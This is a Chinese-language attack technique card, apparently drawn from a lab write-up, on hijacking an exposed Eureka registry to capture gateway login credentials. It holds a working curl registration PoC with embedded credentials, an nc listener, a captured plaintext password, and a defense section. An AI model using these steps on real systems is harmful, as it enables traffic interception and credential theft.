---
id: web-java-framework-spring-eureka-instance-hijack-credential-capture
title: 暴露的 Eureka 注册中心被恶意实例注册劫持网关流量并捕获登录凭据
type: scenario
domain: web
path: web/java/framework/spring
technique: eureka-instance-registration-hijack
aliases:
- Eureka 服务注册劫持
- Spring Cloud 流量劫持
- 恶意微服务实例注册
- 网关流量劫持窃取凭据
- Eureka 未授权注册
- USER-MANAGEMENT-SERVICE 劫持
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- spring-cloud
- eureka
- service-registry
- traffic-hijack
- credential-theft
- xss
cve: []
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:25:16+08:00'
  notes: 已对照原文与图30/32/33核对：application.yaml 泄露 EurekaSrvr:0scarPWDisTheB3st@localhost:8761，图32 的 curl 注册 USER-MANAGEMENT-SERVICE（instanceId 0xdf、ipAddr 10.10.14.6、port 8081、status UP）与卡中 PoC 一致，随后捕获 POST /login 的 miranda 凭据并 SSH 登录。XSS 仅为延伸效果。未涉及版本区间。PoC 未在本机执行。
---

## 一句话结论

Eureka 注册中心暴露且凭据可获取时，攻击者可向 `/eureka/apps/<服务名>` 注册一个 `hostName`/`ipAddr` 指向自己的恶意实例；Spring Cloud Gateway 按服务名从注册中心取实例并负载均衡，会把原本发往真实服务的请求（包括用户登录）转发到攻击者主机，从而截获账号密码、CSRF Token，并可返回恶意页面实施 XSS。

## 原理

- Eureka 是 Spring Cloud 的服务注册与发现组件：服务实例启动后向 Eureka 注册自身（app 名、hostName、ipAddr、port、status 等），网关/客户端从 Eureka 拉取实例列表并按服务名路由或负载均衡。
- 注册接口是 HTTP REST：`POST /eureka/apps/{appName}`，请求体为 `instance` JSON。Eureka 默认不校验注册者身份与实例地址的真实性，只要请求通过 Basic 认证（若开启）即可注册。
- 攻击者拿到 Eureka 凭据（本例来自配置文件/堆转储）后，注册一个与真实服务同名（如 `USER-MANAGEMENT-SERVICE`）的实例，把 `hostName`、`ipAddr` 设为攻击者 IP，`port` 设为攻击者监听端口，`status` 设为 `UP`。
- 网关从 Eureka 获取到该实例后，会把对 `USER-MANAGEMENT-SERVICE` 的请求路由到攻击者。用户在门户登录时，登录表单（含用户名、密码、`_csrf`）被 POST 到攻击者；攻击者记录后转发或直接使用。
- 攻击者还可以对访问者返回恶意 HTML/JS，在受害者浏览器执行 XSS（案例示意图展示弹窗），进一步窃取会话或发起操作。
- 该攻击依赖“注册中心是唯一可信源”的假设被打破：网关信任注册中心，注册中心信任任何持凭据（甚至匿名）的注册请求。

## 触发条件

1. Eureka 服务端口（默认 8761）可从攻击者网络访问，且未做网络隔离。
2. 攻击者拥有 Eureka Basic 认证凭据，或注册接口未鉴权。
3. 网关（Spring Cloud Gateway 等）使用该 Eureka 做服务发现，并按服务名路由。
4. 攻击者知道目标服务名（可从配置、错误页、`/actuator`、注册列表获取）。
5. 攻击者主机可被网关访问（网络可达），并能监听对应端口。

## 利用步骤

1. 访问 Eureka 控制台/接口，确认可读实例列表与认证方式。
2. 获取凭据（配置文件、heapdump、弱口令）并确认注册权限。
3. 在攻击者主机启动 HTTP 服务，监听与服务相同或任意端口，准备记录登录请求/返回恶意页面。
4. 向 Eureka 注册同名恶意实例，`hostName`/`ipAddr` 指向攻击者，`status=UP`。
5. 等待网关刷新实例列表（默认 30 秒级），触发受害者访问/登录。
6. 捕获 `POST /login` 中的用户名、密码、CSRF Token；或返回 XSS 页面。
7. 使用窃取的凭据登录 SSH/其他系统，继续横向。

## PoC

注册恶意实例：

```bash
curl -X POST 'http://EurekaSrvr:0scarPWDisTheB3st@target:8761/eureka/apps/USER-MANAGEMENT-SERVICE' \
  -H 'Content-Type: application/json' \
  -d '{
    "instance": {
      "instanceId": "0xdf",
      "hostName": "10.10.14.6",
      "app": "USER-MANAGEMENT-SERVICE",
      "ipAddr": "10.10.14.6",
      "vipAddress": "USER-MANAGEMENT-SERVICE",
      "status": "UP",
      "port": { "$": 8081, "@enabled": "true" },
      "dataCenterInfo": {
        "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
        "name": "MyOwn"
      }
    }
  }'
```

攻击者侧监听并记录：

```bash
nc -lvnp 8081
```

捕获到的登录请求（节选）：

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=...
X-Forwarded-Host: furni.htb

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=...
```

随后使用该凭据 SSH 登录成功（原文实测 `ssh miranda-wise@furni.htb`）。

## 变体与关联

- 不只登录凭据：所有经网关的服务间请求（含内部 Token、Cookie）都可能被截获。
- 可注册为其他高价值服务名，或注册多个实例做负载均衡分摊，降低异常流量特征。
- 返回恶意页面可在受害者浏览器触发 XSS，配合 Cookie 窃取/CSRF。
- 与 heapdump 凭据泄露、配置文件泄露形成完整链：泄露 → 注册中心 → 流量劫持 → 主机登录。
- 同类问题也存在于其他服务发现组件（Consul、Nacos）未授权注册/配置篡改。

## 检测与防御

- 不要将 Eureka 暴露到公网；放在内网/管理网，使用安全组与网络 ACL 限制来源。
- 启用强认证与 mTLS，限制注册/查询权限；定期轮换 Eureka 凭据，禁止写入配置文件明文。
- 网关侧校验实例元数据：只接受来自预期网段/主机名的实例，或使用服务网格的 workload identity 替代“谁注册都信”。
- 监控 Eureka 注册事件：新增实例、异常 `hostName`/`ipAddr`、短时间重复注册、同名多实例。
- 对网关路由目标做异常检测（流量突然转向非预期 IP），并启用出站访问控制。
- 凭据层面：数据库/注册中心账号与系统账号分离，最小权限，避免一处泄露导致 SSH 登录。
